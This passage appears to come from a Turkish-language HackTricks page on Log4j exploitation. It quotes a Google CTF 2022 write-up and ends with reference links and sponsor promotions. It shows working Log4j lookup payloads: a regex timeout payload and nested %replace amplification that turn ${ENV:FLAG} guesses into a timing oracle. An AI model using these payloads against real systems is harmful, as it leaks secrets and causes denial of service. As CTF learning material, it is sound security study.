Örneğin, `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` gibi bir payload, o CTF'de bir **zaman aşımı** tetikleyecektir.

Bu [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) sayfasında, bir ReDoS saldırısı yerine yanıtta bir zaman farkı oluşturmak için bir **amplifikasyon saldırısı** kullanıldı:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Eğer bayrak `flagGuess` ile başlarsa, tüm bayrak 29 `#` karakteriyle değiştirilir (Bu karakterin bayrağın bir parçası olması olası değildir). **Elde edilen 29 `#` karakterinin her biri 54 `#` karakteriyle değiştirilir**. Bu işlem **6 kez tekrarlanır** ve toplamda ` 29*54*54^6* =`` `` `**`96816014208`  `#` karakteri oluşur!**
>
> Bu kadar çok `#` karakterinin değiştirilmesi, Flask uygulamasının 10 saniyelik zaman aşımını tetikleyecek ve bunun sonucunda kullanıcıya HTTP durum kodu 500 gönderilecektir. (Eğer bayrak `flagGuess` ile başlamazsa, 500 olmayan bir durum kodu alırız)

## Referanslar

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun ve daha hızlı çözün. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR göndererek paylaşın.

</details>
